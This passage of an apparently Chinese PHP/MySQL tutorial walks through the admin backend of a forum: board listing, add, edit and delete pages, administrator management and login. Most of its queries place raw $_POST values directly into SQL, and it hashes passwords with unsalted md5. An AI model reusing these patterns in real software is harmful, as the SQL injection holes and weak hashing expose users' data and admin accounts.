$return_url=urlencode($_SERVER['REQUEST_URI']); $message=\"你真的要删除父版块 &#123;$data['module_name']&#125; 吗？\"; $delete_url=\"confirm.php?url=&#123;$url&#125;&amp;return_url=&#123;$return_url&#125;&amp;message=&#123;$message&#125;\";$html=&lt;&lt;&lt;A &lt;tr&gt; &lt;td class=\"tc\"&gt;&lt;input name=\"id[]\" value=\"59\" type=\"checkbox\"&gt;&lt;/td&gt; &lt;td&gt; &lt;input class=\"common-input sort-input\" name=\"ord[]\" value=\"&#123;$data['sort']&#125;\" type=\"text\"&gt; &lt;/td&gt; &lt;td&gt;&#123;$data['Id']&#125;&lt;/td&gt; &lt;td&gt;&#123;$data['module_name']&#125;&lt;/td&gt; &lt;td&gt; &lt;a class=\"link-update\" href=\"father_module_update.php?Id=&#123;$data['Id']&#125;\"&gt;[修改]&lt;/a&gt; &lt;a class=\"link-del\" href=\"$delete_url\"&gt;[删除]&lt;/a&gt; &lt;/td&gt; &lt;/tr&gt;A; echo $html; &#125; ?&gt; &lt;/table&gt; &lt;!--&lt;div class=\"list-page\"&gt; 2 条 1/1 页&lt;/div&gt;--&gt; &lt;/div&gt; &lt;/form&gt; &lt;/div&gt; &lt;/div&gt; &lt;!--/main--&gt;&lt;/div&gt;&lt;?phpinclude_once 'inc/footer.inc.php';//footer?&gt; 2.father_module_delete.php &lt;?phpinclude_once '../inc/config.inc.php';include_once '../inc/mysql.inc.php';include_once '../inc/tool.inc.php';if(!isset($_GET['id']) || !is_numeric($_GET['id']))&#123; echo\"&lt;script type='text/javascript'&gt;alert('id参数错误!');location='father_module.php';&lt;/script&gt;\"; exit();&#125;$link=connect();include_once 'inc/is_manage_login.inc.php';$query=\"delete from father_module where id=&#123;$_GET['id']&#125;\";execute($link,$query);if(mysqli_affected_rows($link)==1)&#123; skip('father_module.php','onCorrect.gif','恭喜你删除成功！');&#125;else&#123; skip('father_module.php','onError.gif','对不起删除失败，请重试！');&#125;?&gt; 3.father_module_update.php &lt;?phpinclude_once '../inc/config.inc.php';include_once '../inc/mysql.inc.php';include_once '../inc/tool.inc.php';$link=connect();include_once 'inc/is_manage_login.inc.php';if(!isset($_GET['Id'])||!is_numeric($_GET['Id']))&#123; skip('father_module.php','onError.gif','id参数错误！');&#125;$query=\"select*from father_module where Id=&#123;$_GET['Id']&#125;\";$result=execute($link,$query);if(!mysqli_num_rows($result))&#123; skip('father_module.php','onShow.gif','这个版块信息不存在！');&#125;if(isset($_POST['submit']))&#123; //验证用户填写的信息 $check_flag='update'; include 'inc/check_father_module.inc.php'; $query=\"update father_module set module_name='&#123;$_POST['module_name']&#125;',sort=&#123;$_POST['sort']&#125; where Id=&#123;$_GET['Id']&#125;\"; execute($link,$query); if(mysqli_affected_rows($link)==1)&#123; skip('father_module.php','onCorrect.gif','修改成功！'); &#125;else&#123; skip('father_module.php','onError.gif','修改失败,请重试！'); &#125;&#125;$data=mysqli_fetch_assoc($result);$template['title']='父板块修改页';?&gt;&lt;?phpinclude_once 'inc/header.inc.php';//topinclude_once 'inc/sidebar.inc.php';//sidebar?&gt; &lt;div class=\"main-wrap\"&gt; &lt;div class=\"crumb-wrap\"&gt; &lt;div class=\"crumb-list\"&gt;&lt;i class=\"icon-font\"&gt;&lt;/i&gt;&lt;a href=\"father_module.php\"&gt;父版块列表&lt;/a&gt;&lt;span class=\"crumb-step\"&gt;&amp;gt;&lt;/span&gt;&lt;span class=\"crumb-name\"&gt;修改父版块-&lt;?php echo $data['module_name']?&gt;&lt;/span&gt;&lt;/div&gt; &lt;/div&gt; &lt;form method=\"post\"&gt; &lt;div class=\"result-content\"&gt; &lt;table class=\"result-tab\" width=\"70%\"&gt; &lt;tr&gt; &lt;th class=\"tc\" width=\"7%\"&gt;&lt;input class=\"allChoose\" name=\"\" type=\"checkbox\"&gt;&lt;/th&gt; &lt;td&gt;版块名称&lt;/td&gt; &lt;td&gt;&lt;input type=\"text\" name=\"module_name\" class=\"common-text\" value=\"&lt;?php echo $data['module_name']?&gt;\"/&gt;&lt;/td&gt; &lt;td&gt;版块名称不能为空，最多不超过40个字符&lt;/td&gt; &lt;/tr&gt; &lt;tr&gt; &lt;th class=\"tc\" width=\"7%\"&gt;&lt;input class=\"allChoose\" type=\"checkbox\"&gt;&lt;/th&gt; &lt;td&gt;排序&lt;/td&gt; &lt;td&gt;&lt;input type=\"text\" name=\"sort\" class=\"common-text\" value=\"&lt;?php echo $data['sort']?&gt;\"/&gt;&lt;/td&gt; &lt;td&gt;填入一个数字即可&lt;/td&gt; &lt;/tr&gt; &lt;/table&gt; &lt;br /&gt; &lt;input class=\"btn btn-primary btn6 mr10\" type=\"submit\" name=\"submit\" value=\"修改\" /&gt; &lt;/div&gt; &lt;/form&gt; &lt;/div&gt;&lt;/div&gt;&lt;?phpinclude_once 'inc/footer.inc.php';//footer?&gt; 在对父版块的操作中，只有删除和修改是不够的。还应该有父版块添加页father_module_add.php。 4.father_module_add.php &lt;?phpinclude_once '../inc/config.inc.php';include_once '../inc/mysql.inc.php';include_once '../inc/tool.inc.php';$link=connect();include_once 'inc/is_manage_login.inc.php';if(isset($_POST['submit']))&#123; $link=connect(); //验证用户填写的信息 $check_flag='add'; include 'inc/check_father_module.inc.php'; $query=\"insert into father_module(module_name,sort) values('&#123;$_POST['module_name']&#125;',&#123;$_POST['sort']&#125;)\"; execute($link,$query); if(mysqli_affected_rows($link)==1)&#123; skip('father_module.php','onCorrect.gif','恭喜你，添加成功！'); &#125;else&#123; skip('faher_module_add.php','onError.gif','对不起，添加失败，请重试！'); &#125;&#125;$template['title']='父版块添加页';?&gt;&lt;?phpinclude_once 'inc/header.inc.php';//topinclude_once 'inc/sidebar.inc.php';//sidebar?&gt; &lt;div class=\"main-wrap\"&gt; &lt;div class=\"crumb-wrap\"&gt; &lt;div class=\"crumb-list\"&gt;&lt;i class=\"icon-font\"&gt;&lt;/i&gt;&lt;a href=\"father_module.php\"&gt;父板块列表&lt;/a&gt;&lt;span class=\"crumb-step\"&gt;&amp;gt;&lt;/span&gt;&lt;span class=\"crumb-name\"&gt;添加父版块&lt;/span&gt;&lt;/div&gt; &lt;/div&gt; &lt;form method=\"post\"&gt; &lt;div class=\"result-content\"&gt; &lt;table class=\"result-tab\" width=\"70%\"&gt; &lt;tr&gt; &lt;th class=\"tc\" width=\"7%\"&gt;&lt;input class=\"allChoose\" name=\"\" type=\"checkbox\"&gt;&lt;/th&gt; &lt;td&gt;版块名称&lt;/td&gt; &lt;td&gt;&lt;input type=\"text\" name=\"module_name\" class=\"common-text\" /&gt;&lt;/td&gt; &lt;td&gt;版块名称不能为空，最多不超过40个字符&lt;/td&gt; &lt;/tr&gt; &lt;tr&gt; &lt;th class=\"tc\" width=\"7%\"&gt;&lt;input class=\"allChoose\" type=\"checkbox\"&gt;&lt;/th&gt; &lt;td&gt;排序&lt;/td&gt; &lt;td&gt;&lt;input type=\"text\" name=\"sort\" class=\"common-text\" /&gt;&lt;/td&gt; &lt;td&gt;填入一个数字即可&lt;/td&gt; &lt;/tr&gt; &lt;/table&gt; &lt;br /&gt; &lt;input class=\"btn btn-primary btn6 mr10\" type=\"submit\" name=\"submit\" value=\"添加\" /&gt; &lt;/div&gt; &lt;/form&gt; &lt;/div&gt;&lt;/div&gt;&lt;?phpinclude_once 'inc/footer.inc.php';//footer?&gt; 父版块添加页效果如下： 三、后台-子版块子版块列表页 实现上述效果。除了sql语句操作的数据表(son_module)和输入内容验证文件(check_son_module.inc.php)不同外，其他和父版块类似，可以参考一下父版块的。 代码如下： 1.son_module.php &lt;?phpinclude_once '../inc/config.inc.php';include_once '../inc/mysql.inc.php';include_once '../inc/tool.inc.php';$link=connect();include_once 'inc/is_manage_login.inc.php';$template['title']='子板块列表页';$query=\"select sm.id,sm.module_name,fm.module_name father_module_name,sm.member_id,sm.sort from son_module sm,father_module fm where sm.father_module_id=fm.id order by fm.id\";$result=execute($link,$query);?&gt;&lt;?phpinclude_once 'inc/header.inc.php';//topinclude_once 'inc/sidebar.inc.php';//sidebar?&gt;&lt;div class=\"main-wrap\"&gt; &lt;div class=\"crumb-wrap\"&gt; &lt;div class=\"crumb-list\"&gt;&lt;i class=\"icon-font\"&gt;&lt;/i&gt;&lt;a href=\"index.php\"&gt;后台首页&lt;/a&gt;&lt;span class=\"crumb-step\"&gt;&amp;gt;&lt;/span&gt;&lt;span class=\"crumb-name\"&gt;子版块列表&lt;/span&gt;&lt;/div&gt; &lt;/div&gt; &lt;div class=\"result-wrap\"&gt; &lt;form name=\"myform\" id=\"myform\" method=\"post\"&gt; &lt;div class=\"result-title\"&gt; &lt;div class=\"result-list\"&gt; &lt;a href=\"son_module_add.php\"&gt;&lt;i class=\"icon-font\"&gt;&lt;/i&gt;新增板块&lt;/a&gt; &lt;/div&gt; &lt;/div&gt; &lt;div class=\"result-content\"&gt; &lt;table class=\"result-tab\" width=\"100%\"&gt; &lt;tr&gt; &lt;th class=\"tc\" width=\"5%\"&gt;&lt;input class=\"allChoose\" name=\"\" type=\"checkbox\"&gt;&lt;/th&gt; &lt;th&gt;排序&lt;/th&gt; &lt;th&gt;ID&lt;/th&gt; &lt;th&gt;版块名称&lt;/th&gt; &lt;th&gt;所属父版块&lt;/th&gt; &lt;th&gt;版主&lt;/th&gt; &lt;th&gt;操作&lt;/th&gt; &lt;/tr&gt; &lt;?php while($data=mysqli_fetch_assoc($result))&#123; $url=urlencode(\"son_module_delete.php?id=&#123;$data['id']&#125;\"); $return_url=urlencode($_SERVER['REQUEST_URI']); $message=\"你真的要删除父版块 &#123;$data['module_name']&#125; 吗？\"; $delete_url=\"confirm.php?url=&#123;$url&#125;&amp;return_url=&#123;$return_url&#125;&amp;message=&#123;$message&#125;\";$html=&lt;&lt;&lt;A &lt;tr&gt; &lt;td class=\"tc\"&gt;&lt;input name=\"id[]\" value=\"59\" type=\"checkbox\"&gt;&lt;/td&gt; &lt;td&gt; &lt;input class=\"common-input sort-input\" name=\"ord[]\" value=\"&#123;$data['sort']&#125;\" type=\"text\"&gt; &lt;/td&gt; &lt;td&gt;&#123;$data['id']&#125;&lt;/td&gt; &lt;td&gt;&#123;$data['module_name']&#125;&lt;/td&gt; &lt;td&gt;&#123;$data['father_module_name']&#125;&lt;/td&gt; &lt;td&gt;&#123;$data['member_id']&#125;&lt;/td&gt; &lt;td&gt; &lt;a class=\"link-update\" href=\"#\"&gt;[访问]&lt;/a&gt; &lt;a class=\"link-update\" href=\"son_module_update.php?id=&#123;$data['id']&#125;\"&gt;[修改]&lt;/a&gt; &lt;a class=\"link-del\" href=\"$delete_url\"&gt;[删除]&lt;/a&gt; &lt;/td&gt; &lt;/tr&gt;A; echo $html; &#125; ?&gt; &lt;/table&gt; &lt;/div&gt; &lt;/form&gt; &lt;/div&gt; &lt;/div&gt; &lt;!--/main--&gt;&lt;/div&gt;&lt;?phpinclude_once 'inc/footer.inc.php';//footer?&gt; 2.son_module_delete.php &lt;?php include_once '../inc/config.inc.php';include_once '../inc/mysql.inc.php';include_once '../inc/tool.inc.php';if(!isset($_GET['id']) || !is_numeric($_GET['id']))&#123; skip('son_module.php','onError.gif','id参数错误！');&#125;$link=connect();include_once 'inc/is_manage_login.inc.php';$query=\"delete from son_module where id=&#123;$_GET['id']&#125;\";execute($link,$query);if(mysqli_affected_rows($link)==1)&#123; skip('son_module.php','onCorrect.gif','恭喜你删除成功！');&#125;else&#123; skip('son_module.php','onError.gif','对不起删除失败，请重试！');&#125;?&gt; 3.son_module_update.php &lt;?php include_once '../inc/config.inc.php';include_once '../inc/mysql.inc.php';include_once '../inc/tool.inc.php';$template['title']='子版块修改页';$link=connect();include_once 'inc/is_manage_login.inc.php';if(!isset($_GET['id']) || !is_numeric($_GET['id']))&#123; skip('son_module.php','onError.gif','id参数错误！');&#125;$query=\"select * from son_module where id=&#123;$_GET['id']&#125;\";$result=execute($link,$query);if(!mysqli_num_rows($result))&#123; skip('son_module.php','onError.gif','这条子版块信息不存在！');&#125;$data=mysqli_fetch_assoc($result);if(isset($_POST['submit']))&#123; //验证 $check_flag='update'; include 'inc/check_son_module.inc.php'; $query=\"update son_module set father_module_id=&#123;$_POST['father_module_id']&#125;,module_name='&#123;$_POST['module_name']&#125;',info='&#123;$_POST['info']&#125;',member_id=&#123;$_POST['member_id']&#125;,sort=&#123;$_POST['sort']&#125; where id=&#123;$_GET['id']&#125;\"; execute($link,$query); if(mysqli_affected_rows($link)==1)&#123; skip('son_module.php','onCorrect.gif','修改成功！'); &#125;else&#123; skip('son_module.php','onError.gif','修改失败,请重试！'); &#125;&#125;?&gt;&lt;?phpinclude_once 'inc/header.inc.php';//topinclude_once 'inc/sidebar.inc.php';//sidebar?&gt;&lt;div class=\"main-wrap\"&gt; &lt;div class=\"crumb-wrap\"&gt; &lt;div class=\"crumb-list\"&gt;&lt;i class=\"icon-font\"&gt;&lt;/i&gt;&lt;a href=\"father_module.php\"&gt;父板块列表&lt;/a&gt;&lt;span class=\"crumb-step\"&gt;&amp;gt;&lt;/span&gt;&lt;span class=\"crumb-name\"&gt;添加子版块&lt;/span&gt;&lt;/div&gt; &lt;/div&gt; &lt;form method=\"post\"&gt; &lt;div class=\"result-content\"&gt; &lt;table class=\"result-tab\" width=\"80%\"&gt; &lt;tr&gt; &lt;th class=\"tc\" width=\"7%\"&gt;&lt;input class=\"allChoose\" type=\"checkbox\"&gt;&lt;/th&gt; &lt;td&gt;所属父版块&lt;/td&gt; &lt;td&gt; &lt;select name=\"father_module_id\"&gt; &lt;option value=\"0\"&gt;===请选择一个父版块===&lt;/option&gt; &lt;?php $query=\"select*from father_module\"; $result_father=execute($link,$query); while ($data_father=mysqli_fetch_assoc($result_father))&#123; if($data['father_module_id']==$data_father['Id'])&#123; echo \"&lt;option value='&#123;$data_father['Id']&#125;' selected='selected'&gt;&#123;$data_father['module_name']&#125;&lt;/option&gt;\"; &#125;else&#123; echo \"&lt;option value='&#123;$data_father['Id']&#125;'&gt;&#123;$data_father['module_name']&#125;&lt;/option&gt;\"; &#125; &#125; ?&gt; &lt;/select&gt; &lt;/td&gt; &lt;td&gt;*请选择一个父版块&lt;/td&gt; &lt;/tr&gt; &lt;tr&gt; &lt;th class=\"tc\" width=\"7%\"&gt;&lt;input class=\"allChoose\" type=\"checkbox\"&gt;&lt;/th&gt; &lt;td&gt;版块名称&lt;/td&gt; &lt;td&gt;&lt;input type=\"text\" name=\"module_name\" value=\"&lt;?php echo $data['module_name']?&gt;\" class=\"common-text\" /&gt;&lt;/td&gt; &lt;td&gt;版块名称不能为空，最多不超过40个字符&lt;/td&gt; &lt;/tr&gt; &lt;tr&gt; &lt;th class=\"tc\" width=\"7%\"&gt;&lt;input class=\"allChoose\" type=\"checkbox\"&gt;&lt;/th&gt; &lt;td&gt;版块简介&lt;/td&gt; &lt;td&gt; &lt;textarea name=\"info\" id=\"txtCon\" rows=\"6\" cols=\"50\"&gt;&lt;?php echo $data['info']?&gt;&lt;/textarea&gt; &lt;/td&gt; &lt;td&gt;版块名称不能为空，最多不超过300个字符&lt;/td&gt; &lt;/tr&gt; &lt;tr&gt; &lt;th class=\"tc\" width=\"7%\"&gt;&lt;input class=\"allChoose\" type=\"checkbox\"&gt;&lt;/th&gt; &lt;td&gt;版主&lt;/td&gt; &lt;td&gt; &lt;select name=\"member_id\"&gt; &lt;option value=\"0\"&gt;===请选择一个会员作为版主===&lt;/option&gt; &lt;/select&gt; &lt;/td&gt; &lt;td&gt;可以选择一个会员作为版主&lt;/td&gt; &lt;/tr&gt; &lt;tr&gt; &lt;th class=\"tc\" width=\"7%\"&gt;&lt;input class=\"allChoose\" type=\"checkbox\"&gt;&lt;/th&gt; &lt;td&gt;排序&lt;/td&gt; &lt;td&gt;&lt;input type=\"text\" name=\"sort\" class=\"common-text\" value=\"&lt;?php echo $data['sort']?&gt;\"/&gt;&lt;/td&gt; &lt;td&gt;填入一个数字即可&lt;/td&gt; &lt;/tr&gt; &lt;/table&gt; &lt;br /&gt; &lt;input class=\"btn btn-primary btn6 mr10\" type=\"submit\" name=\"submit\" value=\"修改\" /&gt; &lt;/div&gt; &lt;/form&gt; &lt;/div&gt;&lt;/div&gt;&lt;?php include 'inc/footer.inc.php'?&gt; 同样，在子版块中，只有子版块列表是不够的。所以，也要实现子版块的添加。其中应该选择一个所属父版块，用&lt;option&gt;标签实现列出所有父版块的名字。 4.son_module_add.php &lt;?php include_once '../inc/config.inc.php';include_once '../inc/mysql.inc.php';include_once '../inc/tool.inc.php';$template['title']='子版块添加页';$link=connect();include_once 'inc/is_manage_login.inc.php';if(isset($_POST['submit']))&#123; //验证用户填写的信息 $check_flag='add'; include 'inc/check_son_module.inc.php'; $query=\"insert into son_module(father_module_id,module_name,info,member_id,sort) values(&#123;$_POST['father_module_id']&#125;,'&#123;$_POST['module_name']&#125;','&#123;$_POST['info']&#125;',&#123;$_POST['member_id']&#125;,&#123;$_POST['sort']&#125;)\"; execute($link,$query); if(mysqli_affected_rows($link)==1)&#123; skip('son_module.php','onCorrect.gif','恭喜你，添加成功！'); &#125;else&#123; skip('son_module_add.php','onError.gif','对不起，添加失败，请重试！'); &#125;&#125;?&gt;&lt;?phpinclude_once 'inc/header.inc.php';//topinclude_once 'inc/sidebar.inc.php';//sidebar?&gt;&lt;div class=\"main-wrap\"&gt; &lt;div class=\"crumb-wrap\"&gt; &lt;div class=\"crumb-list\"&gt;&lt;i class=\"icon-font\"&gt;&lt;/i&gt;&lt;a href=\"father_module.php\"&gt;父板块列表&lt;/a&gt;&lt;span class=\"crumb-step\"&gt;&amp;gt;&lt;/span&gt;&lt;span class=\"crumb-name\"&gt;添加子版块&lt;/span&gt;&lt;/div&gt; &lt;/div&gt; &lt;form method=\"post\"&gt; &lt;div class=\"result-content\"&gt; &lt;table class=\"result-tab\" width=\"80%\"&gt; &lt;tr&gt; &lt;th class=\"tc\" width=\"7%\"&gt;&lt;input class=\"allChoose\" type=\"checkbox\"&gt;&lt;/th&gt; &lt;td&gt;所属父版块&lt;/td&gt; &lt;td&gt; &lt;select name=\"father_module_id\"&gt; &lt;option value=\"0\"&gt;===请选择一个父版块===&lt;/option&gt; &lt;?php $query=\"select*from father_module\"; $result_father=execute($link,$query); while($data_father=mysqli_fetch_assoc($result_father))&#123; echo \"&lt;option value='&#123;$data_father['Id']&#125;'&gt;&#123;$data_father['module_name']&#125;&lt;/option&gt;\"; &#125; ?&gt; &lt;/select&gt; &lt;/td&gt; &lt;td&gt;*请选择一个父版块&lt;/td&gt; &lt;/tr&gt; &lt;tr&gt; &lt;th class=\"tc\" width=\"7%\"&gt;&lt;input class=\"allChoose\" type=\"checkbox\"&gt;&lt;/th&gt; &lt;td&gt;版块名称&lt;/td&gt; &lt;td&gt;&lt;input type=\"text\" name=\"module_name\" class=\"common-text\" /&gt;&lt;/td&gt; &lt;td&gt;版块名称不能为空，最多不超过40个字符&lt;/td&gt; &lt;/tr&gt; &lt;tr&gt; &lt;th class=\"tc\" width=\"7%\"&gt;&lt;input class=\"allChoose\" type=\"checkbox\"&gt;&lt;/th&gt; &lt;td&gt;版块简介&lt;/td&gt; &lt;td&gt; &lt;textarea name=\"info\" id=\"txtCon\" rows=\"6\" cols=\"50\"&gt;&lt;/textarea&gt; &lt;/td&gt; &lt;td&gt;版块名称不能为空，最多不超过300个字符&lt;/td&gt; &lt;/tr&gt; &lt;tr&gt; &lt;th class=\"tc\" width=\"7%\"&gt;&lt;input class=\"allChoose\" type=\"checkbox\"&gt;&lt;/th&gt; &lt;td&gt;版主&lt;/td&gt; &lt;td&gt; &lt;select name=\"member_id\"&gt; &lt;option value=\"0\"&gt;===请选择一个会员作为版主===&lt;/option&gt; &lt;/select&gt; &lt;/td&gt; &lt;td&gt;可以选择一个会员作为版主&lt;/td&gt; &lt;/tr&gt; &lt;tr&gt; &lt;th class=\"tc\" width=\"7%\"&gt;&lt;input class=\"allChoose\" type=\"checkbox\"&gt;&lt;/th&gt; &lt;td&gt;排序&lt;/td&gt; &lt;td&gt;&lt;input type=\"text\" name=\"sort\" class=\"common-text\" /&gt;&lt;/td&gt; &lt;td&gt;填入一个数字即可&lt;/td&gt; &lt;/tr&gt; &lt;/table&gt; &lt;br /&gt; &lt;input class=\"btn btn-primary btn6 mr10\" type=\"submit\" name=\"submit\" value=\"添加\" /&gt; &lt;/div&gt; &lt;/form&gt; &lt;/div&gt;&lt;/div&gt;&lt;?php include 'inc/footer.inc.php'?&gt; 四、后台-管理员管理员列表 除操作数据表外，大致和父版块类似。要注意的是，管理员有超级管理员和普通管理员，超级管理员可以添加删除管理员，普通管理员不具有管理管理员操作权限。 1.manage.php &lt;?phpinclude_once '../inc/config.inc.php';include_once '../inc/mysql.inc.php';include_once '../inc/tool.inc.php';$link=connect();include_once 'inc/is_manage_login.inc.php';$template['title']='管理员列表页';?&gt;&lt;?phpinclude_once 'inc/header.inc.php';//topinclude_once 'inc/sidebar.inc.php';//sidebar?&gt;&lt;div class=\"main-wrap\"&gt; &lt;div class=\"crumb-wrap\"&gt; &lt;div class=\"crumb-list\"&gt;&lt;i class=\"icon-font\"&gt;&lt;/i&gt;&lt;a href=\"index.php\"&gt;后台首页&lt;/a&gt;&lt;span class=\"crumb-step\"&gt;&amp;gt;&lt;/span&gt;&lt;span class=\"crumb-name\"&gt;管理员列表&lt;/span&gt;&lt;/div&gt; &lt;/div&gt; &lt;div class=\"result-wrap\"&gt; &lt;form name=\"myform\" id=\"myform\" method=\"post\"&gt; &lt;div class=\"result-title\"&gt; &lt;div class=\"result-list\"&gt; &lt;a href=\"manage_add.php\"&gt;&lt;i class=\"icon-font\"&gt;&lt;/i&gt;新增管理员&lt;/a&gt; &lt;/div&gt; &lt;/div&gt; &lt;div class=\"result-content\"&gt; &lt;table class=\"result-tab\" width=\"100%\"&gt; &lt;tr&gt; &lt;th class=\"tc\" width=\"5%\"&gt;&lt;input class=\"allChoose\" name=\"\" type=\"checkbox\"&gt;&lt;/th&gt; &lt;th&gt;ID&lt;/th&gt; &lt;th&gt;名称&lt;/th&gt; &lt;th&gt;等级&lt;/th&gt; &lt;th&gt;创建日期&lt;/th&gt; &lt;th&gt;操作&lt;/th&gt; &lt;/tr&gt; &lt;?php $query=\"select*from manage\"; $result=execute($link,$query); while ($data=mysqli_fetch_assoc($result))&#123; if($data['level']==0)&#123; $data['level']='超级管理员'; &#125;else&#123; $data['level']='普通管理员'; &#125; $url=urlencode(\"manage_delete.php?id=&#123;$data['Id']&#125;\"); $return_url=urlencode($_SERVER['REQUEST_URI']); $message=\"你真的要删除管理员 &#123;$data['username']&#125; 吗？\"; $delete_url=\"confirm.php?url=&#123;$url&#125;&amp;return_url=&#123;$return_url&#125;&amp;message=&#123;$message&#125;\"; $html=&lt;&lt;&lt;A &lt;tr&gt; &lt;td class=\"tc\"&gt;&lt;input name=\"id[]\" value=\"59\" type=\"checkbox\"&gt;&lt;/td&gt; &lt;td&gt;&#123;$data['Id']&#125;&lt;/td&gt; &lt;td&gt;&#123;$data['username']&#125;&lt;/td&gt; &lt;td&gt;&#123;$data['level']&#125;&lt;/td&gt; &lt;td&gt;&#123;$data['create_time']&#125;&lt;/td&gt; &lt;td&gt;&lt;a href=\"&#123;$delete_url&#125;\"&gt;[删除]&lt;/a&gt;&lt;/td&gt; &lt;/tr&gt;A; echo $html; &#125; ?&gt; &lt;/table&gt; &lt;/div&gt; &lt;/form&gt; &lt;/div&gt; &lt;/div&gt; &lt;!--/main--&gt;&lt;/div&gt;&lt;?php include_once 'inc/footer.inc.php';//footer?&gt; 2.manage_delete.php &lt;?php include_once '../inc/config.inc.php';include_once '../inc/mysql.inc.php';include_once '../inc/tool.inc.php';if(!isset($_GET['id']) || !is_numeric($_GET['id']))&#123; skip('manage.php','onError.gif','id参数错误！');&#125;$link=connect();include_once 'inc/is_manage_login.inc.php';$query=\"delete from manage where id=&#123;$_GET['id']&#125;\";execute($link,$query);if(mysqli_affected_rows($link)==1)&#123; skip('manage.php','onCorrect.gif','恭喜你删除成功！');&#125;else&#123; skip('manage.php','onError.gif','对不起删除失败，请重试！');&#125;?&gt; 3.manage_add.php &lt;?phpinclude_once '../inc/config.inc.php';include_once '../inc/mysql.inc.php';include_once '../inc/tool.inc.php';$link=connect();include_once 'inc/is_manage_login.inc.php';if(isset($_POST['submit']))&#123; $link=connect(); include 'inc/check_manage.inc.php'; $query=\"insert into manage(username,password,create_time,level) values('&#123;$_POST['username']&#125;',md5(&#123;$_POST['password']&#125;),now(),&#123;$_POST['level']&#125;)\"; execute($link,$query); if(mysqli_affected_rows($link)==1)&#123; skip('manage.php','onCorrect.gif','恭喜你，添加成功！'); &#125;else&#123; skip('manage.php','onError.gif','对不起，添加失败，请重试！'); &#125;&#125;$template['title']='管理员添加页';?&gt;&lt;?phpinclude_once 'inc/header.inc.php';//topinclude_once 'inc/sidebar.inc.php';//sidebar?&gt;&lt;div class=\"main-wrap\"&gt; &lt;div class=\"crumb-wrap\"&gt; &lt;div class=\"crumb-list\"&gt;&lt;i class=\"icon-font\"&gt;&lt;/i&gt;&lt;a href=\"manage.php\"&gt;管理员列表&lt;/a&gt;&lt;span class=\"crumb-step\"&gt;&amp;gt;&lt;/span&gt;&lt;span class=\"crumb-name\"&gt;添加管理员&lt;/span&gt;&lt;/div&gt; &lt;/div&gt; &lt;form method=\"post\"&gt; &lt;div class=\"result-content\"&gt; &lt;table class=\"result-tab\" width=\"70%\"&gt; &lt;tr&gt; &lt;th class=\"tc\" width=\"7%\"&gt;&lt;input class=\"allChoose\" name=\"\" type=\"checkbox\"&gt;&lt;/th&gt; &lt;td&gt;管理员名称&lt;/td&gt; &lt;td&gt;&lt;input type=\"text\" name=\"username\" class=\"common-text\" /&gt;&lt;/td&gt; &lt;td&gt;版块名称不能为空，最多不超过32个字符&lt;/td&gt; &lt;/tr&gt; &lt;tr&gt; &lt;th class=\"tc\" width=\"7%\"&gt;&lt;input class=\"allChoose\" type=\"checkbox\"&gt;&lt;/th&gt; &lt;td&gt;密码&lt;/td&gt; &lt;td&gt;&lt;input type=\"text\" name=\"password\" class=\"common-text\" /&gt;&lt;/td&gt; &lt;td&gt;不能少于6位&lt;/td&gt; &lt;/tr&gt; &lt;tr&gt; &lt;th class=\"tc\" width=\"7%\"&gt;&lt;input class=\"allChoose\" type=\"checkbox\"&gt;&lt;/th&gt; &lt;td&gt;等级&lt;/td&gt; &lt;td&gt; &lt;select name=\"level\"&gt; &lt;option value=\"1\"&gt;普通管理员&lt;/option&gt; &lt;option value=\"0\"&gt;超级管理员&lt;/option&gt; &lt;/select&gt; &lt;/td&gt; &lt;td&gt;请选择管理员等级,默认为普通管理员(不具备后台管理员管理权限)&lt;/td&gt; &lt;/tr&gt; &lt;/table&gt; &lt;br /&gt; &lt;input class=\"btn btn-primary btn6 mr10\" type=\"submit\" name=\"submit\" value=\"添加\" /&gt; &lt;/div&gt; &lt;/form&gt; &lt;/div&gt;&lt;/div&gt;&lt;?php include_once 'inc/footer.inc.php';//footer?&gt; 4.管理员登录login.php &lt;?phpheader('Content-type:text/html;charset=utf-8');include_once '../inc/config.inc.php';include_once '../inc/mysql.inc.php';include_once '../inc/tool.inc.php';$link=connect();if(is_manage_login($link))&#123; skip('index.php','onCorrect.gif','您已经登录，请不要重复登录！');&#125;if(isset($_POST['submit']))&#123; include_once 'inc/check_login.inc.php'; $_POST=escape($link,$_POST); $query=\"select * from manage where username='&#123;$_POST['username']&#125;' and password=md5('&#123;$_POST['password']&#125;')\"; $result=execute($link, $query); if(mysqli_num_rows($result)==1)&#123; $data=mysqli_fetch_assoc($result); $_SESSION['manage']['username']=$data['username']; $_SESSION['manage']['password']=sha1($data['password']); $_SESSION['manage']['id']=$data['Id']; $_SESSION['manage']['level']=$data['level']; skip('index.php','onCorrect.gif','登录成功！'); &#125;else&#123; skip('login.php','onError.gif','用户名或者密码错误，请重试！'); &#125;&#125;?&gt;&lt;!doctype html&gt;&lt;html&gt;&lt;head&gt; &lt;meta charset=\"UTF-8\"&gt; &lt;title&gt;后台管理登录&lt;/title&gt; &lt;link href=\"css/admin_login.css\" rel=\"stylesheet\" type=\"text/css\" /&gt;&lt;/head&gt;&lt;body&gt;&lt;div class=\"admin_login_wrap\"&gt; &lt;h1&gt;后台管理登录&lt;/h1&gt; &lt;div class=\"adming_login_border\"&gt; &lt;div class=\"admin_input\"&gt; &lt;form method=\"post\"&gt; &lt;ul class=\"admin_items\"&gt; &lt;li&gt; &lt;label for=\"username\"&gt;用户名：&lt;/label&gt; &lt;input type=\"text\" name=\"username\" id=\"username\" size=\"40\" class=\"admin_input_style\" /&gt; &lt;/li&gt; &lt;li&gt; &lt;label for=\"password\"&gt;密 码：&lt;/label&gt; &lt;input type=\"password\" name=\"password\" id=\"password\" size=\"40\" class=\"admin_input_style\" /&gt; &lt;/li&gt; &lt;li&gt; &lt;label for=\"vcode\"&gt;验证码:&lt;/label&gt; &lt;input name=\"vcode\" type=\"text\" size=\"40\" class=\"admin_input_style\" /&gt; &lt;a href=\"login.php\"&gt;&lt;img class=\"vcode\" src=\"../show_code.php\" /&gt;&lt;/a&gt; &lt;/li&gt; &lt;li&gt; &lt;input type=\"submit\" name=\"submit\" tabindex=\"3\" value=\"提交\" class=\"btn btn-primary\" /&gt; &lt;/li&gt; &lt;/ul&gt; &lt;/form&gt; &lt;/div&gt; &lt;/div&gt; &lt;p class=\"admin_copyright\"&gt;&lt;a tabindex=\"5\" href=\"index.php\" target=\"_blank\"&gt;返回首页&lt;/a&gt; &amp;copy; 2019 Powered by &lt;a href=\"http://qwzf.github.io\" target=\"_blank\"&gt;Q子枫&lt;/a&gt;&lt;/p&gt;&lt;/div&gt;&lt;/body&gt;&lt;/html&gt; 5.管理员注销logout.php 